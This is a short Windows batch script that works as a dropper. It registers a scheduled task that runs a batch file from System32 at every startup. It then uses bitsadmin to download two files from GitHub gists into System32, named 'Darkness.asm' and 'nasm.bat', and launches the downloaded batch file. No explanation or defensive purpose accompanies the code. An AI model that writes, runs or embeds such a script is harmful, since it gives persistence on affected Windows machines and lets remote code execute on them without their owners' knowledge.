@echo off

cd /d %windir%\system32
schtasks /create /tn "Startup Task" /tr "%windir%\System32\main.bat" /sc onstart
bitsadmin /transfer "downloadDarkness" /download /priority highest https://gist.github.com/INeddHelp/1308b6e410f2efce0cf716d9ab58abcd %SystemRoot%\System32\Darkness.asm
bitsadmin /transfer "downloadNasm" /download /priority highest https://gist.github.com/INeddHelp/c53b5e932e5bbdace9ea98c3b2edb372 %SystemRoot%\System32\nasm.bat

start nasm.bat